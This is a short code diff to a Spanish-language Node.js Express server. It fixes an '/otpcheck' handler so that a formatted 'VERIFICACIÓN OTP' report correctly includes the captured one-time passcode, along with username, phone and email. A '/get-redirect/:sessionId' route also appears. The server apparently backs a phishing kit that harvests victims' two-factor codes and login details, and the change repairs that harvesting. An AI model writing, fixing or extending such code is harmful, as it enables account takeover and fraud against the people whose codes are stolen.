@@ -148,7 +148,7 @@ app.post('/otpcheck', async (req, res) => {
 ---
 🔐 VERIFICACIÓN OTP
 
-• OTP: otp || 'N/D'}
+• OTP: ${data.otp || 'N/D'}
 • Usuario: ${data.user || 'N/D'}
 • Teléfono: ${data.telnum || 'N/D'}
 • Email: ${data.email || 'N/D'}
@@ -306,5 +306,3 @@ app.get('/get-redirect/:sessionId', (req, res) => {
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
-
-
